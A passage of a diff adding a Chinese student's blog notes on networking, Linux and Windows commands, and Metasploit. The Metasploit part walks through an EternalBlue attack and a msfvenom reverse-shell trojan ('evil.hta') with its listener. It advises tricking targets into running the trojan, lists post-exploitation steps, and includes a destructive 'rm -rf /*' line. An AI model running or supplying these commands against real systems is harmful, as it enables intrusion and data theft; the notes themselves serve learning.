+<p><strong>// 4. 保存游戏</strong>
+<strong>[内存] 对局数据 → [硬盘] replay文件</strong></p>
+<h2 id="https协议http">
+<a class="header-anchor" href="#https%e5%8d%8f%e8%ae%aehttp"></a>
+https协议/http
+</h2><p>实际就是一个公钥密码体制和私钥密码体制以及CA配合的过程，我们所有的社交软件聊天也是这样的</p>
+<ol>
+<li><strong>CA验证</strong>：服务器发送数字证书，浏览器用内置CA公钥验证签名，确保证书里的公钥是真的、没被篡改。</li>
+<li><strong>非对称加密传密钥</strong>：浏览器生成对称密钥，用证书里的服务器公钥加密后传给服务器，服务器用私钥解密，安全协商出共同密钥。</li>
+<li><strong>对称加密传数据</strong>：之后所有网页数据都用这个对称密钥加密传输，保证效率的同时防止窃听和篡改。</li>
+</ol>
+<h2 id="漏洞扫描">
+<a class="header-anchor" href="#%e6%bc%8f%e6%b4%9e%e6%89%ab%e6%8f%8f"></a>
+漏洞扫描
+</h2><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">步骤</th>
+          <th style="text-align: left">做什么</th>
+          <th style="text-align: center">技术</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">1</td>
+          <td style="text-align: left"><strong>主机发现</strong></td>
+          <td style="text-align: center">Ping扫描（找活的主机）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">2</td>
+          <td style="text-align: left"><strong>端口扫描</strong></td>
+          <td style="text-align: center">找开放端口</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">3</td>
+          <td style="text-align: left"><strong>服务识别</strong></td>
+          <td style="text-align: center">识别端口上跑的服务（如HTTP、SSH）</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left"><strong>漏洞扫描</strong></td>
+          <td style="text-align: center">检测已知漏洞</td>
+      </tr>
+  </tbody>
+</table>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405211618310.png" alt="image-20260405211618310"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405211854267.png" alt="image-20260405211854267"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405212115500.png" alt="image-20260405212115500"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405212155322.png" alt="image-20260405212155322"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405213750038.png" alt="image-20260405213750038"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260405214044434.png" alt="image-20260405214044434"></p>
+<h2 id="linux指令">
+<a class="header-anchor" href="#linux%e6%8c%87%e4%bb%a4"></a>
+Linux指令
+</h2><p><strong>ls   列目录     ls -l     列目录和文件属性   d表示目录   -表示普通文件    ls -a  列隐藏文件   ls -la   所有隐藏属性   ll进文件</strong></p>
+<p><strong>rwx   read write execute 读写执行    用户   组</strong></p>
+<p><strong>cd 进目录       cd ..     cd -</strong></p>
+<p><strong>pwd  路径打印</strong></p>
+<p><strong>cat    首字母＋Tab</strong></p>
+<p><strong>head  看头   tail  看尾     &ndash;lines=        q  退出    less    more    也是看</strong></p>
+<p><strong>ESc+:q!</strong></p>
+<p><strong>nano    修改文件</strong></p>
+<p><strong>vim   按i可以开始修改   wq   写完之后退出</strong></p>
+<p><strong>file  +文件名</strong></p>
+<p><strong>where  +文件</strong></p>
+<p><strong>echo  是打印</strong></p>
+<p><strong>h=&ldquo;hello&rdquo;   echo $h</strong></p>
+<p><strong>${h}</strong></p>
+<p><strong>mv 文件名 新文件名    改名</strong></p>
+<p><strong>for ff in week??</strong></p>
+<p><strong>do</strong></p>
+<p><strong>echo $ff</strong></p>
+<p><strong>done</strong></p>
+<p><strong>do</strong></p>
+<p><strong>mv   文件名   zifuchuan{ff#zifuchuan}</strong></p>
+<h2 id="ip">
+<a class="header-anchor" href="#ip"></a>
+IP
+</h2><h4 id="私有地址">
+<a class="header-anchor" href="#%e7%a7%81%e6%9c%89%e5%9c%b0%e5%9d%80"></a>
+私有地址：
+</h4><p>A类： 10.0.0.0 到 10.255.255.255</p>
+<p>B类： 172.16.0.0 到 172.31.255.255</p>
+<p>C类： 192.168.0.0 到 192.168.255.255</p>
+<h4 id="分类别">
+<a class="header-anchor" href="#%e5%88%86%e7%b1%bb%e5%88%ab"></a>
+分类别：
+</h4><p>A类： 1.0.0.0 到 126.255.255.255。其中127.0.0.0段被保留做回环地址（通常指127.0.0.1），不用于公网分配。</p>
+<p>B类： 128.0.0.0 到 191.255.255.255。</p>
+<p>C类： 192.0.0.0 到 223.255.255.255。（这就是你提到的“192段到223段”）</p>
+<p>D类： 224.0.0.0 到 239.255.255.255。</p>
+<p>掩码写成二进制，连续的1代表网络位，连续的0代表主机位。例如，一个255.255.255.0（/24）的掩码，前24位是1，意味着前3段（如192.168.1）是网段，最后一段（.x）是主机号。</p>
+<p><strong>可用的主机数 = 2^（主机位的位数） - 2</strong></p>
+<p>计算网络地址用逻辑与         异或是相同为0   不同为1</p>
+<h1 id="前端语言学习">
+<a class="header-anchor" href="#%e5%89%8d%e7%ab%af%e8%af%ad%e8%a8%80%e5%ad%a6%e4%b9%a0"></a>
+前端语言学习
+</h1><p>selos用来共享文件</p>
+<p>HTML 和CSS公用    HTML是输入那些    CSS是渲染</p>
+<p>可以用AI和VScode共同使用</p>
+<h1 id="heading">
+<a class="header-anchor" href="#heading"></a>
+。。
+</h1><p>Xshell   secureCRT</p>
+<h1 id="博客文章上传指令">
+<a class="header-anchor" href="#%e5%8d%9a%e5%ae%a2%e6%96%87%e7%ab%a0%e4%b8%8a%e4%bc%a0%e6%8c%87%e4%bb%a4"></a>
+博客文章上传指令
+</h1><p>hugo
+cd public
+git add .
+git commit -m &ldquo;新增文章：文章标题&rdquo;
+git push</p>
+<h1 id="linux指令学习">
+<a class="header-anchor" href="#linux%e6%8c%87%e4%bb%a4%e5%ad%a6%e4%b9%a0"></a>
+linux指令学习
+</h1><p>linux以比较低的配置更好的运行</p>
+<p>基于linux内核   出现了 Debian Federa SUSE 等发行家族</p>
+<h4 id="linux中一切皆文件-目录文件">
+<a class="header-anchor" href="#linux%e4%b8%ad%e4%b8%80%e5%88%87%e7%9a%86%e6%96%87%e4%bb%b6-%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6"></a>
+linux中一切皆文件 目录文件
+</h4><p>/root 管理员主目录</p>
+<p>/bin 经常使用命令，二进核心文件</p>
+<p>/boot 存启动时的核心文件  链接文件隐藏文件等等</p>
+<p>/dev 设备，web设备，访问设备</p>
+<p>/etc 系统管理配置，子目录</p>
+<p>/home  用户目录</p>
+<p>/var 修改和扩充的东西</p>
+<p>/lib 动态链接共享库，所有文件都会用共享库</p>
+<p>/usr  用户应用程序和文件</p>
+<p>/media 设备，U盘光驱，所挂的地方</p>
+<p>linux远程登陆  :  Xshell   secureCRT</p>
+<p>链接方法:点+，ssh2，IP地址，双击即可</p>
+<p>sevice network restart 重启系统   选项会话关声音</p>
+<p>clear 清屏</p>
+<p>文件处理命令:</p>
+<p>ls -l   列表展示文件</p>
+<p>ls -a显示说有文件和隐藏文件</p>
+<p>ls -h按字节形式展示文件</p>
+<p>ls /bin    ls+目录</p>
+<p>mkdir 创建文件</p>
+<p>cd 加路径  进入某路径</p>
+<p>mkdir 1/2/3/4 -p   创建多个路径</p>
+<p>pwd查看当前目录</p>
+<p>touch 创建一个文件</p>
+<p>vim 创建并编辑    上下左右移动 esc加冒号加斜杠 查找  按a和A上下查找</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">操作</th>
+          <th style="text-align: left">命令（命令模式下）</th>
+          <th style="text-align: left">说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong>进入编辑</strong></td>
+          <td style="text-align: left"><code>i</code></td>
+          <td style="text-align: left">在光标前插入</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>a</code></td>
+          <td style="text-align: left">在光标后插入</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>o</code></td>
+          <td style="text-align: left">在下一行另起一行插入</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>I</code> / <code>A</code></td>
+          <td style="text-align: left">在行首/行尾插入</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>删除</strong></td>
+          <td style="text-align: left"><code>x</code></td>
+          <td style="text-align: left">删除光标处的字符</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>dd</code></td>
+          <td style="text-align: left">删除整行</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>dw</code></td>
+          <td style="text-align: left">删除光标到单词末尾</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>d$</code> / <code>d0</code></td>
+          <td style="text-align: left">删除到行尾/行首</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>复制粘贴</strong></td>
+          <td style="text-align: left"><code>yy</code></td>
+          <td style="text-align: left">复制整行</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>yw</code></td>
+          <td style="text-align: left">复制单词</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>p</code></td>
+          <td style="text-align: left">在光标后粘贴</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>P</code></td>
+          <td style="text-align: left">在光标前粘贴</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>查找</strong></td>
+          <td style="text-align: left"><code>/关键词</code></td>
+          <td style="text-align: left">向下搜索，按 <code>n</code> 跳转下一个</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>?关键词</code></td>
+          <td style="text-align: left">向上搜索</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong>撤销重做</strong></td>
+          <td style="text-align: left"><code>u</code></td>
+          <td style="text-align: left">撤销上一步</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left"><code>Ctrl + r</code></td>
+          <td style="text-align: left">重做（恢复撤销）</td>
+      </tr>
+  </tbody>
+</table>
+<p>esc 输入冒号 按wq保存并退出  q直接退出</p>
+<p>cat 加文件名  正序读取  tac  倒叙读取</p>
+<p>cat -n 加行号查看文件</p>
+<p>more 加文件名  一页一页读   按回车键逐渐展示</p>
+<p>less命令  显示的少  一点一点显示</p>
+<p>head -加数字   查看前几行的内容</p>
+<p>tail -加数字  读取末尾多少行内容</p>
+<p>cp 第一个目录下的文件 第二个目录  复制</p>
+<p>find 加目录  查看当前目录下的文件</p>
+<p>mv  是剪切文件</p>
+<p>mv 第一个文件名 第二个文件名   更名</p>
+<p>rm 加文件  用来删除文件</p>
+<p>rm -f 直接删除不询问</p>
+<p>rm -rf 加目录  直接把目录下所有文件</p>
+<p>rm -rf /*  删库跑路  全删</p>
+<h4 id="文件搜索命令">
+<a class="header-anchor" href="#%e6%96%87%e4%bb%b6%e6%90%9c%e7%b4%a2%e5%91%bd%e4%bb%a4"></a>
+文件搜索命令
+</h4><p>find&lt;搜索范围&gt;&lt;匹配条件&gt;</p>
+<p>find -name 按文件名搜索    find -name &ldquo;*.txt&quot;查看所有该文件名后缀的文件</p>
+<p>find . -name &ldquo;*.txt&rdquo;  查看当前目录所有后缀为txt的</p>
+<p>../  上一级目录</p>
+<p>find -amin-n 在过去n分钟被读过的文件</p>
+<p>find -atime -n 在过去n天内被读过的文件</p>
+<p>find -anewer file 比这个文件更晚读过的文件</p>
+<p>find -cmin -n 过去n分钟被修改过的文件</p>
+<p>find -ctime -n  &hellip;&hellip;&hellip;.</p>
+<p>find -cnewer -n &hellip;&hellip;&hellip;.</p>
+<p>find -type f  文件 类型查找   d 目录查找  l 链接查找</p>
+<p>find加范围加条件   find /bin -type l</p>
+<p>find / -type f -size 0 -exec ls -l</p>
+<h4 id="权限管理命令">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e7%ae%a1%e7%90%86%e5%91%bd%e4%bb%a4"></a>
+权限管理命令
+</h4><p>chmod</p>
+<p>先用ls -l 查看权限</p>
+<p>-是文件   d是目录 b是快文件 c 是字符文件</p>
+<p>所有者用户权限 -当前组用户权限 -其他用户权限</p>
+<p>rwx  读写执行</p>
+<p>chmod +或者-权限 文件/文件夹/目录</p>
+<p>chmod -R u+或者-权限 文件/文件夹/目录   管理所有者的</p>
+<p>g 是管理用户组的  o 是管理其他用户的</p>
+<p>chmod -R +777  文件/文件夹/文件目录</p>
+<p>rwx=111=4+2+1</p>
+<p>r-x=101=4+0+1=5</p>
+<p>rw-=110=4+2+0=6</p>
+<p>r&ndash;=100=4+0+0=4</p>
+<h4 id="压缩解压命令">
+<a class="header-anchor" href="#%e5%8e%8b%e7%bc%a9%e8%a7%a3%e5%8e%8b%e5%91%bd%e4%bb%a4"></a>
+压缩解压命令
+</h4><p>gzip 文件     压缩文件</p>
+<p>gzip -d 文件   解压文件不保留源文件</p>
+<p>zip -r 文件 目录 然后删除源文件再解压压缩包</p>
+<p>unzip 压缩文件</p>
+<p>tar -zcf 压缩后取得文件名 被压缩目录   压缩</p>
+<p>tar -zxvf 压缩包文件名    解压</p>
+<p>-f 指定文件名      -v  显示详情信息  -z打包同时压缩   解包同时解压</p>
+<h4 id="网络命令">
+<a class="header-anchor" href="#%e7%bd%91%e7%bb%9c%e5%91%bd%e4%bb%a4"></a>
+网络命令
+</h4><p>ping</p>
+<p>ifconfig</p>
+<p>netstatgrge</p>
+<p>netstat -tlun 查看本机正在监听的  t代表tcp  u代表udp</p>
+<p>l代表监听  n代表IP地址</p>
+<p>-rn  查看路由表</p>
+<p>-anp 所有端口号信息</p>
+<p>-anpt 查看tcp的端口信息</p>
+<h4 id="其他">
+<a class="header-anchor" href="#%e5%85%b6%e4%bb%96"></a>
+其他
+</h4><p>uname -a 查看本机版本和信息</p>
+<p>whoami</p>
+<p>id代表当前用户信息</p>
+<p>last 显示之前登录系统用户的信息</p>
+<p>lastlog所有用户最后依次登陆信息</p>
+<p>useradd 添加用户</p>
+<p>su 加用户名  切换到该用户权限</p>
+<p>在root下 passwd 用户名    改密码</p>
+<p>userdel 删除用户</p>
+<p>cat/var/log  查看日志    在一个路径就是查看指定目录下的日志</p>
+<p>history  查看历史命令</p>
+<p>cat~/.bash_history 查看历史操作命令</p>
+<p>crontab -l 计划脚本  定时执行   crontab -b 可以编辑脚本   用vim   按i就可以了</p>
+<p>crontab -u 用户 -l   某用户下的计划任务</p>
+<h4 id="查看进程">
+<a class="header-anchor" href="#%e6%9f%a5%e7%9c%8b%e8%bf%9b%e7%a8%8b"></a>
+查看进程
+</h4><p>ps aux |grep 进程</p>
+<p>a:查看其他用户  x:查看自己 u:查看进程的用户名和</p>
+<p>kill 进程号    kill -9 进程号（强制删除）</p>
+<p>删除后 /home下还有文件夹  用rm删除</p>
+<p>groups 用户名1 用户名2    查看在不在同一个用户组</p>
+<p>ps -u 用户名   查看指定用户进程</p>
+<p>top命令  实时查看刷新进程</p>
+<p>按m内存从大大小   按p占CPU排序  按c显示完整命令</p>
+<h1 id="metasploit">
+<a class="header-anchor" href="#metasploit"></a>
+Metasploit
+</h1><p>一个漏洞框架，简称<strong>MSF</strong></p>
+<p>漏洞利用，后端渗透</p>
+<h4 id="专业术语">
+<a class="header-anchor" href="#%e4%b8%93%e4%b8%9a%e6%9c%af%e8%af%ad"></a>
+专业术语：
+</h4><p>exploit   exp武器</p>
+<p>payload 攻击载荷</p>
+<p>shellcode 拿权限，利用软件漏洞   本地和远程</p>
+<p>module 漏洞攻击辅助</p>
+<p>lisener 监听器</p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260406113628398.png" alt="image-20260406113628398"></p>
+<p>service postgresql start</p>
+<p>msfdb init</p>
+<p>msfconsole</p>
+<p>db_status</p>
+<p><strong>msfconsole的：</strong></p>
+<p>show wxploits   查看所有可用的渗透攻击程序代码</p>
+<p>show auxiliary  查看所有可用的辅助攻击工具</p>
+<p>show options  查看该模块所有可用选项</p>
+<p>show payloads 查看该模块适用的所有载荷代码</p>
+<p>show targets  查看该模块适用的攻击目标类型</p>
+<p>info</p>
+<p><strong>msfvenom的:</strong></p>
+<p>-p payload</p>
+<p>-e 编码方式</p>
+<p>-i 编码次数</p>
+<p>-b  在生成的程序中避免出现的值</p>
+<p>LOHOST,LPORT 监听上线的主机IP和端口</p>
+<p>-f exe 生成EXE格式</p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260406120806711.png" alt="image-20260406120806711"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260406120936955.png" alt="image-20260406120936955"></p>
+<p>MSF：</p>
+<p><code>msfconsole</code>和<code>msfvenom</code>是Metasploit框架中的两个核心组件，一个用于交互式攻击指挥，另一个用于生成恶意载荷。</p>
+<p>具体区别如下：</p>
+<h3 id="-msfconsole主控台">
+<a class="header-anchor" href="#-msfconsole%e4%b8%bb%e6%8e%a7%e5%8f%b0"></a>
+📡 msfconsole：主控台
+</h3><p><code>msfconsole</code>是Metasploit框架最主要的<strong>命令行接口</strong>。你可以把它理解为整个渗透测试操作的中心控制平台。</p>
+<ul>
+<li><strong>核心功能</strong>：在这里输入各种命令来启动攻击模块（Exploit）、管理攻击载荷（Payload）、建立监听器、以及控制已经攻陷的目标主机（通过Meterpreter会话）。</li>
+<li><strong>工作方式</strong>：提供一个交互式环境，让你能够搜索并使用Metasploit框架内数以千计的模块（如漏洞利用、扫描器等），并对这些模块进行详细的参数配置。</li>
+</ul>
+<h3 id="-msfvenom载荷生成器">
+<a class="header-anchor" href="#-msfvenom%e8%bd%bd%e8%8d%b7%e7%94%9f%e6%88%90%e5%99%a8"></a>
+🧬 msfvenom：载荷生成器
+</h3><p><code>msfvenom</code>是一个<strong>独立的命令行工具</strong>，专门用于生成和编码攻击载荷。它由旧版工具<code>msfpayload</code>和<code>msfencode</code>合并而来。</p>
+<ul>
+<li><strong>核心功能</strong>：根据你的要求，“定制”生成一个恶意程序或一段代码（即Payload）。</li>
+<li><strong>工作方式</strong>：你通过参数指定Payload的类型（如<code>windows/meterpreter/reverse_tcp</code>）、你的IP地址（<code>LHOST</code>）、监听端口（<code>LPORT</code>）以及输出格式（如<code>exe</code>、<code>elf</code>、<code>python</code>等），它会生成对应的恶意文件。</li>
+</ul>
+<blockquote>
+<p><strong>一句话总结</strong>：<strong><code>msfvenom</code>负责制造“炮弹”（生成木马），而<code>msfconsole</code>负责发射“炮弹”并接收“战果”（配置监听器并控制目标）。</strong></p>
+</blockquote>
+<hr>
+<h3 id="-主动攻击与被动攻击的一般流程">
+<a class="header-anchor" href="#-%e4%b8%bb%e5%8a%a8%e6%94%bb%e5%87%bb%e4%b8%8e%e8%a2%ab%e5%8a%a8%e6%94%bb%e5%87%bb%e7%9a%84%e4%b8%80%e8%88%ac%e6%b5%81%e7%a8%8b"></a>
+⚔️ 主动攻击与被动攻击的一般流程
+</h3><p>在MSF中，攻击模式主要分为**主动（Active）<strong>和</strong>被动（Passive）**两种。</p>
+<h4 id="1-主动攻击流程">
+<a class="header-anchor" href="#1-%e4%b8%bb%e5%8a%a8%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b"></a>
+1. 主动攻击流程
+</h4><p>主动攻击是指攻击机<strong>主动向目标机的开放端口发送攻击数据</strong>。这类攻击通常利用目标系统上运行的网络服务漏洞（如SMB、RPC等）。</p>
+<p><strong>特点</strong>：直接、快速，但容易被防火墙拦截或触发入侵检测系统（IDS）警报。</p>
+<p><strong>一般流程</strong>：</p>
+<ol>
+<li>
+<p><strong>信息收集</strong>：使用Nmap等工具扫描目标，发现其开放端口和操作系统版本。</p>
+</li>
+<li>
+<p><strong>启动控制台</strong>：在Kali Linux中输入<code>msfconsole</code>启动主控台。</p>
+</li>
+<li>
+<p><strong>搜索模块</strong>：根据漏洞信息搜索对应的攻击模块，例如著名的<code>ms17_010_eternalblue</code>（永恒之蓝）。</p>
+<p>bash</p>
+<pre tabindex="0"><code>search ms17-010
+</code></pre></li>
+<li>
+<p><strong>使用模块</strong>：选定要使用的攻击模块。</p>
+<p>bash</p>
+<pre tabindex="0"><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre></li>
+<li>
+<p><strong>配置参数</strong>：使用<code>show options</code>查看必填项，通常需要设置目标IP（<code>RHOSTS</code>）和本机IP（<code>LHOST</code>，用于反向连接时）。</p>
+<p>bash</p>
+<pre tabindex="0"><code>set RHOSTS 192.168.1.100
+set LHOST 192.168.1.5
+</code></pre></li>
+<li>
+<p><strong>选择载荷</strong>：设定攻击成功后回连的载荷（Payload），通常选用反向连接的Meterpreter。</p>
+<p>bash</p>
+<pre tabindex="0"><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp
+</code></pre></li>
+<li>
+<p><strong>发动攻击</strong>：输入<code>run</code>或<code>exploit</code>执行攻击。</p>
+<p>bash</p>
+<pre tabindex="0"><code>exploit
+</code></pre></li>
+<li>
+<p><strong>后渗透</strong>：攻击如果成功，会建立一个Meterpreter会话，输入<code>sessions -i 1</code>进入会话进行后续操作。</p>
+</li>
+</ol>
+<h4 id="2-被动攻击流程">
+<a class="header-anchor" href="#2-%e8%a2%ab%e5%8a%a8%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b"></a>
+2. 被动攻击流程
+</h4><p>被动攻击是指攻击机<strong>在本地搭建一个恶意的服务器（如Web、FTP服务器）</strong>，诱导目标客户端（如浏览器、Office软件）主动连接过来，从而触发漏洞。</p>
+<p><strong>特点</strong>：需要一定的社会工程学技巧来欺骗用户，但成功率更高，且能穿透大部分边界防火墙。</p>
+<p><strong>一般流程</strong>：</p>
+<ol>
+<li>
+<p><strong>生成木马</strong>：使用<code>msfvenom</code>生成一个恶意文件，例如一个包含恶意宏的Word文档或一个伪装成PDF的恶意程序。</p>
+<p>bash</p>
+<pre tabindex="0"><code># 示例：生成一个HTA文件
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f hta-psh -o evil.hta
+</code></pre></li>
+<li>
+<p><strong>启动控制台</strong>：启动<code>msfconsole</code>。</p>
+</li>
+<li>
+<p><strong>配置监听</strong>：使用<code>exploit/multi/handler</code>模块，设置一个与生成木马时<strong>完全相同</strong>的Payload和IP/端口参数。</p>
+<p>bash</p>
+<pre tabindex="0"><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit
+</code></pre></li>
+<li>
+<p><strong>发起诱导</strong>：此时MSF会开始监听等待连接。你需要将生成的木马文件发送给目标，并想方设法诱骗他在他的电脑上运行。</p>
+</li>
+<li>
+<p><strong>获得会话</strong>：一旦目标运行了木马，MSF的监听器就会捕捉到连接，并自动建立Meterpreter会话。</p>
+</li>
+</ol>
+<p>background存会话</p>
+<p>session -1</p>
+<p>session 1进入会话   然后help直接操作就行</p>
+<p>很有可能木马会被删除</p>
+<p>所以先ps查看进程  然后migrate 3333   迁移到另外一个端口</p>
+<p>getlwd 查看当前进程</p>
+<p>getwd 查看对方进程</p>
+<p>切换目录 然后ls  可以对文件执行操作</p>
+<p>shell 进入命令行</p>
+<p>download text.txt 目录   可以下载到指定路径</p>
+<p>getuid  查看当前用户情况</p>
+<p>先getsystem  提升系统权限之后再getuid查看</p>
+<p>之后用upload 加拖拽文件 加路径 可以上传指定文件到对应靶机的路径下</p>
+<p>execute -h</p>
+<p>screenshot截图</p>
+<p>run vnc实时查看对面电脑正在进行什么操作</p>
+<p>再拿到会话后 输入help也可以进行别的操作</p>
+<p>最后可以执行几遍back退出</p>
+<p>session -l</p>
+<p>show options后   L开头是我的  R开头是对面的</p>
+<p>主动攻击还需要show target</p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260406212601225.png" alt="image-20260406212601225"></p>
+<p><img src="C:%5CUsers%5C34059%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20260406212855025.png" alt="image-20260406212855025"></p>
+<h1 id="windows指令">
+<a class="header-anchor" href="#windows%e6%8c%87%e4%bb%a4"></a>
+windows指令
+</h1><p><strong>msinfo32</strong>   查看BIOS版本，主板型号，已安装驱动列表</p>
+<p><strong>dxdiag</strong>   运行 <code>dxdiag</code> → “显示”选项卡查看显存大小、驱动日期；运行 3D 加速测试</p>
+<p>wmic   wmic cpu get name → 显示 CPU 型号
+wmic diskdrive get serialnumber → 获取硬盘序列号</p>
+<p><strong>systeminfo</strong>   显示 OS 版本、安装补丁、网卡配置等</p>
+<p>示例：命令行输入 systeminfo | find &ldquo;系统启动时间&rdquo; → 查看本次开机时长</p>
+<p><strong>ipconfig</strong>   ipconfig /all → 显示所有网卡的 MAC 地址、DHCP 状态</p>
+<p>ipconfig /release + ipconfig /renew → 手动释放并重新获取 IP（适用于 DHCP 网络）</p>
+<p>ipconfig /flushdns → 清空 DNS 缓存，解决网页解析错误</p>
+<h6 id="ping---网络连通性与延迟测试">
+<a class="header-anchor" href="#ping---%e7%bd%91%e7%bb%9c%e8%bf%9e%e9%80%9a%e6%80%a7%e4%b8%8e%e5%bb%b6%e8%bf%9f%e6%b5%8b%e8%af%95"></a>
+<code>ping</code> - 网络连通性与延迟测试
+</h6><p>示例：<code>ping -t baidu.com</code> → 持续 ping 直到手动停止（Ctrl+C），用于观察丢包率
+<code>ping -n 20 -l 1400 192.168.1.1</code> → 发送 20 个 1400 字节包到网关，测试大包传输</p>
+<p><strong>tracert</strong>   用途：定位网络瓶颈或故障节点</p>
+<p>示例：tracert -d github.com → 不解析域名（加快速度），显示从本机到服务器的每一跳延迟</p>
+<p><strong>netstat</strong>  netstat -ano → 显示所有连接及对应 PID（可查异常外连进程）</p>
+<p>netstat -an | find &ldquo;ESTABLISHED&rdquo; → 仅显示已建立的 TCP 连接</p>
+<p>netstat -e → 统计网卡收发包数量</p>
+<p>tasklist   tasklist /fi &ldquo;memusage gt 500000&rdquo; → 显示内存占用超过 500MB 的进程
+tasklist /svc → 查看每个进程对应的 Windows 服务</p>
+<p><strong>taskkill</strong>   taskkill /pid 1234 /f → 强制结束 PID 1234 的进程
+taskkill /im notepad.exe /f → 强制关闭所有记事本窗口</p>
+<p>services.msc - 服务控制台（图形化）
+用途：设置服务启动类型、手动启停</p>
+<p>示例：运行 services.msc → 找到 Print Spooler → 右键重启以清空打印队列</p>
+<p><strong>diskpart</strong>  磁盘分区工具</p>
+<p>list disk          → 显示所有硬盘
+select disk 0      → 选中磁盘0
+list partition     → 查看分区
+clean              → 擦除整个磁盘（慎用！）</p>
+<p><strong>chkdsk</strong>   示例：chkdsk C: /f /r → 检查 C 盘逻辑错误并尝试恢复坏扇区（需重启）</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">指令</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">用法举例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong><code>cd</code></strong></td>
+          <td style="text-align: left">切换当前目录</td>
+          <td style="text-align: left"><code>cd C:\Users</code> (进入指定目录) <code>cd ..</code> (返回上级目录) <code>cd \</code> (回到当前盘符的根目录)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>dir</code></strong> / <strong><code>ls</code></strong></td>
+          <td style="text-align: left">列出当前目录下的文件和文件夹</td>
+          <td style="text-align: left"><code>dir</code> (CMD中使用) <code>ls</code> (PowerShell中使用，体验接近Linux) <code>dir -Name</code> (仅显示名称)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>cls</code></strong></td>
+          <td style="text-align: left">清空当前屏幕内容</td>
+          <td style="text-align: left"><code>cls</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>echo</code></strong></td>
+          <td style="text-align: left">输出文本，或写入文件</td>
+          <td style="text-align: left"><code>echo Hello World</code> (屏幕输出) <code>echo 123 &gt; test.txt</code> (将&quot;123&quot;写入文件)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>type</code></strong></td>
+          <td style="text-align: left">直接在终端查看文本文件内容</td>
+          <td style="text-align: left"><code>type C:\readme.txt</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>exit</code></strong></td>
+          <td style="text-align: left">关闭当前命令行窗口</td>
+          <td style="text-align: left"><code>exit</code></td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">指令</th>
+          <th style="text-align: left">说明</th>
+          <th style="text-align: left">用法举例</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left"><strong><code>mkdir</code></strong></td>
+          <td style="text-align: left">创建新文件夹</td>
+          <td style="text-align: left"><code>mkdir my_project</code> (在当前目录创建) <code>mkdir D:\backup\data</code> (指定路径创建)</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"><strong><code>rmdir</code></strong> / <strong><code>rd</code></strong></td>
+          <td style="text-align: left">删除<strong>空</strong>文件夹</td>
+          <td style="text-align: left"><code>rd empty_folder</code></td>
